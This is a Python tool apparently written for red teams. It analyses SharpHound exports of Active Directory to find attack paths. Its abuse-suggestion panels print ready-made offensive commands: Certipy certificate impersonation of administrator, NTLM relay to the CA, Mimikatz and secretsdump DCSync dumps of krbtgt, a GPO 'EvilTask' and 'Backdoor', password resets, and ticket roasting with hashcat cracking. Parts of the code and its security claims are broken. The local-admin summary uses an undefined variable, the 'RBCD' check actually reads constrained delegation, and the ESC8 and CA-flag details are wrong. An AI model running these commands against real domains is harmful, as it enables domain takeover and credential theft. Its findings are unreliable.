#!/usr/bin/env python3
import json
import os
import sys
import argparse
import networkx as nx
from collections import defaultdict
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress
from rich import print as rprint
from tqdm import tqdm
import time

__version__ = "1.3.0"  # Feel free to update this as you make changes

console = Console()

# ────────────────────────────────────────────────
# Intro Banner
# ────────────────────────────────────────────────
def print_intro_banner(mode_str):
    console.rule(f"[bold magenta]BloodBash v{__version__} - SharpHound Offline Analyzer[/bold magenta]", style="magenta")
    
    console.print(Panel(
        f"""
Parses SharpHound JSON files → finds AD attack paths & misconfigurations

What it shows:
• High-value targets (admins, krbtgt, CAs, templates, NTAuth...)
• AD CS misconfigs (ESC1–ESC8)
• Dangerous ACLs & permissions
• DCSync / replication rights
• RBCD opportunities
• Kerberoastable & AS-REP roastable accounts
• Weak GPO rights
• Shortest paths to high-value targets (optional)
• Local admin / session summary (when data exists)

Abuse suggestions: Shown once per vulnerable category (when found)
Common tools: Certipy, Impacket, Rubeus, Mimikatz, SharpGPOAbuse, etc.

Mode: [cyan]{mode_str}[/cyan]
For authorized security testing / red teaming only.

Use --help for all options.
""",
        title="Quick Overview",
        border_style="bright_blue",
        padding=(1, 2)
    ))

    console.print("[bold]Color guide:[/bold]")
    console.print("  [red]Red[/red]          = Critical findings (ESCs, DCSync, dangerous rights)")
    console.print("  [yellow]Yellow[/yellow]       = Medium risk (weak GPOs, roastable accounts)")
    console.print("  [green]Green[/green]        = No issues / success / principals with rights")
    console.print("  [cyan]Cyan[/cyan]         = Object names, targets, templates, types, counts")
    console.print("  [magenta]Magenta[/magenta]      = Section headers & dividers only")
    console.print("  [dim]Dim[/dim]          = Minor notes or empty results\n")


# ────────────────────────────────────────────────
# Type Mapping (SharpHound v6+)
# ────────────────────────────────────────────────
TYPE_FROM_META = {
    "users": "User",
    "computers": "Computer",
    "groups": "Group",
    "gpos": "GPO",
    "ous": "OU",
    "domains": "Domain",
    "containers": "Container",
    "certtemplates": "Certificate Template",
    "enterprisecas": "Enterprise CA",
    "rootcas": "Root CA",
    "aiacas": "AIA CA",
    "ntauthstores": "NTAuth Store",
}

# ────────────────────────────────────────────────
# Abuse Suggestions Helper
# ────────────────────────────────────────────────
def print_abuse_panel(vuln_type: str):
    title = f"Abuse Suggestions: {vuln_type}"
    content = ""
    border = "red"

    if vuln_type == "ESC1-ESC8 (AD CS)":
        content = """
[bold red]Impact:[/bold red] Certificate-based privilege escalation (ESC1–ESC8) → impersonate users (often admins/DA), relay attacks, or obtain high-value certificates.

Common tools: Certipy[](https://github.com/ly4k/Certipy), ntlmrelayx.py (Impacket)

ESC1/ESC2/ESC6 examples:
certipy req -u lowpriv@domain.local -p 'Password!' -ca 'DOMAIN-CA' \\
    -template VulnerableTemplate -upn administrator@domain.local

ESC8 (NTAuth relay):
ntlmrelayx.py -t https://ca.domain.local/certsrv/certfnsh.asp --adcs --template VulnerableTemplate -smb2support

Warning: Requires network access to CA/DC + low-priv creds. Authorized testing only.
"""
    elif vuln_type == "DCSync":
        content = """
[bold red]Impact:[/bold red] Dump NTDS hashes (krbtgt, admins, etc.) → Golden Ticket, pass-the-hash, domain compromise.

Tools: Mimikatz or Impacket secretsdump

Mimikatz:
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /all /csv

Impacket:
secretsdump.py domain/user:password@dc-ip -just-dc
secretsdump.py -just-dc-ntds domain/user:password@dc-ip
"""
    elif vuln_type == "GPO Abuse":
        content = """
[bold yellow]Impact:[/bold yellow] Modify GPO → deploy malicious scheduled tasks/scripts → code execution / priv esc on affected machines.

Tools: SharpGPOAbuse, pyGPOAbuse, PowerView

SharpGPOAbuse example:
SharpGPOAbuse.exe --gponame "VulnerableGPO" --computer "target$" --taskname "EvilTask" --task "powershell.exe -c evil.ps1"

PowerView:
New-GPOImmediateTask -TaskName "Backdoor" -Command "powershell.exe ..."
"""
    elif vuln_type == "Dangerous Permissions":
        content = """
[bold red]Impact:[/bold red] Varies by right — ResetPassword → account takeover; GenericAll → full control; WriteDacl → own object.

Common abuses:

- Reset/ForceChangePassword:
  net user target NewPass123! /domain

- GenericAll on user/group:
  Add yourself or reset password

- WriteDacl:
  Grant self GenericAll then proceed

Warning: Requires control of the principal with the dangerous right.
"""
    elif vuln_type == "Kerberoastable":
        content = """
[bold yellow]Impact:[/bold yellow] Request TGS → offline crack weak service account password.

Tool: Impacket

GetUserSPNs.py -request -outputfile hashes.txt domain/user:password@domain.local

Crack:
hashcat -m 13100 hashes.txt wordlist.txt
"""
    elif vuln_type == "AS-REP Roastable":
        content = """
[bold yellow]Impact:[/bold yellow] Request AS-REP without preauth → offline crack user hash.

Tools: Rubeus or Impacket

Rubeus:
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

Impacket:
GetNPUsers.py domain/ -usersfile users.txt -format hashcat -dc-ip dc-ip

Crack (mode 18200):
hashcat -m 18200 hashes.asreproast wordlist.txt
"""
    elif vuln_type == "RBCD":
        content = """
[bold red]Impact:[/bold red] Resource-Based Constrained Delegation → S4U2Self/S4U2Proxy impersonation.

Tool: Impacket rbcd.py

rbcd.py -delegate-from 'attacker$' -delegate-to 'target$' \\
    -action write -dc-ip dc-ip domain/user:password

Then use getST.py or Rubeus s4u.
"""

    if content:
        console.print(Panel(content, title=title, border_style=border))
    else:
        console.print(f"[dim]No abuse example defined for {vuln_type}[/dim]")


# ────────────────────────────────────────────────
# Loading & Graph Building
# ────────────────────────────────────────────────
def load_json_dir(directory):
    nodes = {}
    files = [f for f in os.listdir(directory) if f.lower().endswith('.json')]
    
    with Progress() as progress:
        task = progress.add_task("[cyan]Loading JSON files...", total=len(files))
        for filename in files:
            path = os.path.join(directory, filename)
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    raw = json.load(f)
                    meta_type = raw.get("meta", {}).get("type", "").lower()
                    obj_type = TYPE_FROM_META.get(meta_type, "Unknown")

                    data = raw.get('data') or raw.get('Results') or raw.get('objects') or raw
                    if not isinstance(data, list):
                        data = [data]

                    for item in data:
                        oid = item.get('ObjectIdentifier')
                        if not oid:
                            continue
                        if 'ObjectType' not in item:
                            item = item.copy()
                            item['ObjectType'] = obj_type
                        nodes[oid] = item
            except Exception as e:
                console.print(f"[yellow]Warning: Failed to parse {filename}: {e}[/yellow]")
            progress.advance(task)
    console.print(f"[green]✓ Loaded {len(nodes)} objects from {len(files)} files[/green]")
    return nodes

def build_graph(nodes):
    G = nx.MultiDiGraph()
    name_to_oid = {}

    with tqdm(total=len(nodes), desc="Building graph", unit="node") as pbar:
        for oid, node in nodes.items():
            props = node.get('Properties', {}) or {}
            name = props.get('name') or props.get('Name') or oid
            name = name.upper().split('@')[0]

            obj_type = (node.get('ObjectType') or node.get('Type') or 'Unknown').capitalize()
            G.add_node(oid, name=name, type=obj_type, props=props)
            name_to_oid[name] = oid

            # Relationships
            for key in ['MemberOf', 'AdminTo', 'HasSession', 'AllowedToAct', 'HasSIDHistory']:
                rels = node.get(key, [])
                if not isinstance(rels, list):
                    rels = [rels] if rels else []
                for rel in rels:
                    target = rel.get('ObjectIdentifier') if isinstance(rel, dict) else rel
                    if target and target in nodes:
                        G.add_edge(oid, target, label=key)

            # ACLs
            aces = node.get('Aces', [])
            for ace in aces:
                principal = ace.get('PrincipalSID') or ace.get('PrincipalObjectIdentifier')
                right = ace.get('RightName')
                if principal and right and principal in nodes:
                    G.add_edge(principal, oid, label=right)
            pbar.update(1)

    console.print(f"[green]✓ Graph built: {G.number_of_nodes()} nodes, {G.number_of_edges()} edges[/green]")
    return G, name_to_oid

# ────────────────────────────────────────────────
# VERBOSE SUMMARY
# ────────────────────────────────────────────────
def print_verbose_summary(G):
    console.rule("[bold magenta]VERBOSE SUMMARY[/bold magenta]")
    
    types_count = defaultdict(int)
    for _, d in G.nodes(data=True):
        types_count[d['type']] += 1

    table = Table(title="Object Types", show_header=True, header_style="bold cyan")
    table.add_column("Type", style="green")
    table.add_column("Count", justify="right", style="yellow")
    
    for t, cnt in sorted(types_count.items(), key=lambda x: x[1], reverse=True):
        table.add_row(t, str(cnt))
    
    console.print(table)

    users = [d['name'] for _, d in G.nodes(data=True) if d['type'] == 'User']
    if users:
        console.print(f"\n[bold cyan]Users ({len(users)}):[/bold cyan]")
        for name in sorted(users)[:30]:
            console.print(f"  • {name}")
        if len(users) > 30:
            console.print(f"  ... and {len(users)-30} more")
    else:
        console.print("\n[yellow]No User objects found[/yellow]")

# ────────────────────────────────────────────────
# Helpers
# ────────────────────────────────────────────────
def get_high_value_targets(G):
    keywords = [
        'domain admins', 'enterprise admins', 'schema admins', 'administrators',
        'krbtgt', 'domain controllers', 'dnsadmins', 'enterprise key admins',
        'certificate template', 'enterprise ca', 'root ca', 'ntauth',
    ]
    targets = []
    for n, d in G.nodes(data=True):
        name = d['name'].lower()
        typ = d['type'].lower()
        if any(k in name for k in keywords) or 'ca' in typ or 'template' in typ or 'ntauth' in typ:
            targets.append((n, d['name'], d['type']))
    return sorted(targets, key=lambda x: x[1])

def format_path(G, path):
    if len(path) < 2:
        return G.nodes[path[0]]['name']
    parts = []
    for i in range(len(path)-1):
        u, v = path[i], path[i+1]
        edges = G.get_edge_data(u, v)
        label = next(iter(edges.values()))['label'] if edges else '???'
        parts.append(f"[bold cyan]{G.nodes[u]['name']}[/bold cyan] --[[yellow]{label}[/yellow]]-->")
    parts.append(f"[bold red]{G.nodes[path[-1]]['name']}[/bold red]")
    return " ".join(parts)

# ────────────────────────────────────────────────
# ADCS ESC1–ESC8
# ────────────────────────────────────────────────
def print_adcs_vulnerabilities(G):
    console.rule("[bold magenta]ADCS ESC Vulnerabilities (ESC1–ESC8)[/bold magenta]")
    found = False

    for n, d in G.nodes(data=True):
        if d['type'] not in ['Certificate Template', 'Enterprise CA', 'NTAuth Store']:
            continue

        name = d['name']
        incoming = G.in_edges(n, data=True)
        rights = {d['label'] for _, _, d in incoming}

        # ESC1 / ESC2
        if 'Certificate Template' in d['type']:
            props = d['props']
            if 'Enroll' in rights and (
                'ENROLLEE_SUPPLIES_SUBJECT' in props.get('flags', []) or
                not props.get('requiresmanagerapproval', False)
            ):
                found = True
                console.print(f"[red]ESC1/ESC2[/red]: [bold cyan]{name}[/bold cyan] (Enroll + weak config)")
                for u, _, edge in incoming:
                    if edge['label'] == 'Enroll':
                        console.print(f"  → [green]{G.nodes[u]['name']}[/green] can Enroll")

        # ESC3
        if 'Certificate Template' in d['type'] and not d['props'].get('requiresmanagerapproval', False):
            dangerous = {'GenericAll', 'WriteDacl', 'WriteOwner', 'GenericWrite'}
            if any(r in rights for r in dangerous):
                found = True
                console.print(f"[red]ESC3[/red]: [bold cyan]{name}[/bold cyan] (no approval + dangerous rights)")
                for u, _, edge in incoming:
                    if edge['label'] in dangerous:
                        console.print(f"  → [green]{G.nodes[u]['name']}[/green] --[{edge['label']}]-->")

        # ESC6
        if 'Enterprise CA' in d['type'] and 'EDITF_ATTRIBUTESUBJECALTNAME2' in d['props'].get('flags', []):
            if 'Enroll' in rights:
                found = True
                console.print(f"[red]ESC6[/red]: [bold cyan]{name}[/bold cyan] (EDITF_ATTRIBUTESUBJECALTNAME2 + Enroll)")

        # ESC8
        if 'NTAuth Store' in d['type'] and 'GenericAll' in rights:
            found = True
            console.print(f"[red]ESC8[/red]: [bold cyan]{name}[/bold cyan] (GenericAll on NTAuth)")

    if found:
        print_abuse_panel("ESC1-ESC8 (AD CS)")
    else:
        console.print("[green]No obvious ESC1–ESC8 misconfigurations detected[/green]")

# ────────────────────────────────────────────────
# GPO Abuse
# ────────────────────────────────────────────────
def print_gpo_abuse(G):
    console.rule("[bold magenta]GPO Abuse Risks[/bold magenta]")
    found = False

    for n, d in G.nodes(data=True):
        if d['type'] != 'GPO':
            continue
        name = d['name']
        incoming = G.in_edges(n, data=True)
        rights = {d['label'] for _, _, d in incoming}

        dangerous = {'GenericAll', 'WriteDacl', 'WriteOwner', 'GenericWrite'}
        if any(r in rights for r in dangerous):
            found = True
            console.print(f"[yellow]Weak GPO[/yellow]: [bold cyan]{name}[/bold cyan]")
            for u, _, edge in incoming:
                if edge['label'] in dangerous:
                    console.print(f"  → [green]{G.nodes[u]['name']}[/green] --[{edge['label']}]-->")

    if found:
        print_abuse_panel("GPO Abuse")
    else:
        console.print("[green]No dangerous GPO rights found[/green]")

# ────────────────────────────────────────────────
# DCSync / Replication Rights
# ────────────────────────────────────────────────
def print_dcsync_rights(G):
    console.rule("[bold magenta]DCSync / Replication Rights[/bold magenta]")
    found = False

    domain_oids = [n for n, d in G.nodes(data=True) if d['type'] == 'Domain']
    if not domain_oids:
        console.print("[yellow]No domain objects found[/yellow]")
        return

    dangerous_rights = {'GetChangesAll', 'Replicating Directory Changes All', 'Replicating Directory Changes In Filtered Set'}
    
    for domain_oid in domain_oids:
        incoming = G.in_edges(domain_oid, data=True)
        for u, _, d in incoming:
            if d['label'] in dangerous_rights:
                found = True
                console.print(f"[red]DCSync possible[/red]: [green]{G.nodes[u]['name']}[/green] --[{d['label']}]--> Domain")

    if found:
        print_abuse_panel("DCSync")
    else:
        console.print("[green]No DCSync rights detected[/green]")

# ────────────────────────────────────────────────
# RBCD
# ────────────────────────────────────────────────
def print_rbcd(G):
    console.rule("[bold magenta]Resource-Based Constrained Delegation (RBCD)[/bold magenta]")
    found = False

    for n, d in G.nodes(data=True):
        if d['type'] != 'Computer':
            continue
        props = d['props']
        if props.get('msds-allowedtodelegateto', []):
            found = True
            console.print(f"  • [bold cyan]{d['name']}[/bold cyan] allows delegation from:")
            for tgt in props['msds-allowedtodelegateto']:
                console.print(f"      - {tgt}")

    if found:
        print_abuse_panel("RBCD")
    else:
        console.print("[green]No RBCD configured computers found[/green]")

# ────────────────────────────────────────────────
# Shortest Paths
# ────────────────────────────────────────────────
def print_shortest_paths(G, max_paths=5, target_filter=None):
    console.rule("[bold magenta]Shortest Paths to High-Value Targets[/bold magenta]")
    users = [n for n, d in G.nodes(data=True) if d['type'] == 'User']
    targets = get_high_value_targets(G)

    if target_filter:
        targets = [t for t in targets if target_filter.lower() in t[1].lower()]

    if not targets:
        console.print("[yellow]No high-value targets found[/yellow]")
        return

    for tid, tname, ttype in targets[:5]:
        console.print(f"\n[bold]Target:[/bold] [bold cyan]{tname}[/bold cyan] ({ttype})")
        count = 0
        for source in users:
            if source == tid or not nx.has_path(G, source, tid):
                continue
            try:
                path = nx.shortest_path(G, source, tid)
                console.print(f"  [dim]→[/dim] {format_path(G, path)}")
                count += 1
                if count >= max_paths:
                    break
            except nx.NetworkXNoPath:
                pass
        if count == 0:
            console.print("    [dim]No paths found[/dim]")

# ────────────────────────────────────────────────
# Dangerous Permissions
# ────────────────────────────────────────────────
def print_dangerous_permissions(G):
    console.rule("[bold magenta]Dangerous Permissions on High-Value Objects[/bold magenta]")
    dangerous_rights = {
        'GenericAll', 'Owns', 'WriteDacl', 'WriteOwner', 'AllExtendedRights',
        'GenericWrite', 'AddMember', 'ResetPassword', 'ForceChangePassword',
        'ManageCA', 'ManageCertificates', 'Enroll', 'CertificateEnroll', 'WriteProperty'
    }
    targets = get_high_value_targets(G)
    found = False

    for tid, tname, ttype in targets:
        incoming = G.in_edges(tid, data=True)
        dangerous_edges = [
            (u, d['label']) for u, v, d in incoming if d['label'] in dangerous_rights
        ]
        if dangerous_edges:
            found = True
            console.print(f"\n[bold cyan]{tname} ({ttype}):[/bold cyan]")
            for principal_oid, right in dangerous_edges:
                principal_name = G.nodes[principal_oid]['name']
                console.print(f"  • [green]{principal_name}[/green] --[[yellow]{right}[/yellow]]--> [cyan]{tname}[/cyan]")

    if found:
        print_abuse_panel("Dangerous Permissions")
    else:
        console.print("[green]No dangerous ACLs found on high-value objects[/green]")

# ────────────────────────────────────────────────
# Kerberoastable & AS-REP Roastable
# ────────────────────────────────────────────────
def print_kerberoastable(G):
    console.rule("[bold magenta]Kerberoastable Accounts[/bold magenta]")
    found = False
    for n, d in G.nodes(data=True):
        if d['type'] != 'User':
            continue
        props = d.get('props', {})
        if props.get('hasspn', False) and not props.get('sensitive', False) and props.get('enabled', True):
            found = True
            console.print(f"  • [cyan]{d['name']}[/cyan]")

    if found:
        print_abuse_panel("Kerberoastable")
    else:
        console.print("[green]None found[/green]")

def print_as_rep_roastable(G):
    console.rule("[bold magenta]AS-REP Roastable Accounts (DONT_REQ_PREAUTH)[/bold magenta]")
    found = False
    for n, d in G.nodes(data=True):
        if d['type'] != 'User':
            continue
        props = d.get('props', {})
        if props.get('dontreqpreauth', False) and props.get('enabled', True):
            found = True
            console.print(f"  • [cyan]{d['name']}[/cyan]")

    if found:
        print_abuse_panel("AS-REP Roastable")
    else:
        console.print("[green]None found[/green]")

# ────────────────────────────────────────────────
# Sessions / LocalAdmin
# ────────────────────────────────────────────────
def print_sessions_localadmin(G):
    console.rule("[bold magenta]Session / LocalAdmin Summary[/bold magenta]")
    computers = [n for n, d in G.nodes(data=True) if d['type'] == 'Computer']
    if not computers:
        console.print("[yellow]No computers with session data[/yellow]")
        return

    table = Table(title="Top Local Admins", show_header=True, header_style="bold magenta")
    table.add_column("Principal", style="cyan")
    table.add_column("Count", justify="right")
    table.add_column("Examples", style="green")

    from collections import Counter
    admin_edges = [e for e in G.edges(data=True) if e[2].get('label') == 'LocalAdmin']
    counts = Counter(u for u, _, _ in admin_edges)
    
    for principal, count in counts.most_common(10):
        examples = [G.nodes[v]['name'] for _, v, d in admin_edges if u == principal][:3]
        table.add_row(G.nodes[principal]['name'], str(count), ", ".join(examples))

    console.print(table)

# ────────────────────────────────────────────────
# Export
# ────────────────────────────────────────────────
def export_results(G, output_prefix="bashound", format_type="md"):
    if format_type == "md":
        path = f"{output_prefix}.md"
        with open(path, "w", encoding="utf-8") as f:
            f.write("# BashHound Report\n\n")
            f.write("## High-Value Targets\n")
            for _, name, typ in get_high_value_targets(G):
                f.write(f"- {name} ({typ})\n")
            f.write("\n## Sample Paths\n")
            # Simplified - add more if desired
        console.print(f"[green]Exported Markdown:[/green] {path}")

    elif format_type == "json":
        path = f"{output_prefix}.json"
        summary = {
            "nodes": G.number_of_nodes(),
            "edges": G.number_of_edges(),
            "high_value": [
                {"name": d['name'], "type": d['type']} for _, d in G.nodes(data=True)
                if any(k in d['name'].lower() for k in ['admin', 'krbtgt', 'ca', 'template'])
            ]
        }
        with open(path, "w", encoding="utf-8") as f:
            json.dump(summary, f, indent=2)
        console.print(f"[green]Exported JSON:[/green] {path}")

# ────────────────────────────────────────────────
# Main
# ────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="BloodBash - Advanced BloodHound Analyzer with Abuse Suggestions")
    parser.add_argument('directory', nargs='?', default='.', help='Path to SharpHound JSON files')

    parser.add_argument('--shortest-paths', action='store_true')
    parser.add_argument('--dangerous-permissions', action='store_true')
    parser.add_argument('--adcs', action='store_true')
    parser.add_argument('--gpo-abuse', action='store_true')
    parser.add_argument('--dcsync', action='store_true')
    parser.add_argument('--rbcd', action='store_true')
    parser.add_argument('--sessions', action='store_true')
    parser.add_argument('--kerberoastable', action='store_true')
    parser.add_argument('--as-rep-roastable', action='store_true')
    parser.add_argument('--verbose', action='store_true')
    parser.add_argument('--all', action='store_true')
    parser.add_argument('--export', nargs='?', const='md', choices=['md', 'json'], help='Export results')
    parser.add_argument('--fast', action='store_true', help='Fast mode (skip heavy pathfinding)')

    args = parser.parse_args()

    start_time = time.time()

    nodes = load_json_dir(args.directory)
    if not nodes:
        console.print("[red]No objects loaded. Exiting.[/red]")
        sys.exit(1)

    G, _ = build_graph(nodes)

    # Determine mode string for banner
    if args.all:
        mode_str = "Full analysis (--all)"
    elif any([args.shortest_paths, args.dangerous_permissions, args.adcs, args.gpo_abuse,
              args.dcsync, args.rbcd, args.sessions, args.kerberoastable, args.as_rep_roastable]):
        mode_str = "Selected checks"
    else:
        mode_str = "Default (verbose summary + common checks)"

    print_intro_banner(mode_str)

    run_all = args.all or not any([
        args.shortest_paths, args.dangerous_permissions, args.adcs, args.gpo_abuse,
        args.dcsync, args.rbcd, args.sessions, args.kerberoastable, args.as_rep_roastable
    ])

    if args.verbose or run_all:
        print_verbose_summary(G)

    if args.shortest_paths or run_all:
        if not args.fast:
            print_shortest_paths(G)

    if args.dangerous_permissions or run_all:
        print_dangerous_permissions(G)

    if args.adcs or run_all:
        print_adcs_vulnerabilities(G)

    if args.gpo_abuse or run_all:
        print_gpo_abuse(G)

    if args.dcsync or run_all:
        print_dcsync_rights(G)

    if args.rbcd or run_all:
        print_rbcd(G)

    if args.sessions or run_all:
        print_sessions_localadmin(G)

    if args.kerberoastable or run_all:
        print_kerberoastable(G)

    if args.as_rep_roastable or run_all:
        print_as_rep_roastable(G)

    if args.export:
        export_results(G, format_type=args.export)

    elapsed = time.time() - start_time
    console.print(f"\n[italic green]Completed in {elapsed:.2f} seconds[/italic green]")

if __name__ == '__main__':
    main()
